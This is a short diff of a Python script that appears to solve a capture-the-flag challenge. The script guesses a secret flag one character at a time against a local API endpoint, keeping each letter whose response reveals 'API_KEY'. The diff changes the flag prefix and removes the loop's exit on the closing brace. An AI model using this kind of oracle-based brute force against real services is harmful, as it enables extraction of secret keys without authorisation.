@@ -2,7 +2,7 @@ import requests
 
 flag_letters = 'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_-{}'
 index = 0
-flag = "FLAG{"
+flag = "FLAG-"
 url = "http://localhost:3000/api_key"
 headers = {'Content-type': 'application/json'}
 while True:
@@ -13,6 +13,3 @@ while True:
         if "API_KEY" in response.text:
             flag = flag + letter
             print(flag)
-            if letter == "}":
-                print("Total requests: " + str(index))
-                exit(0)
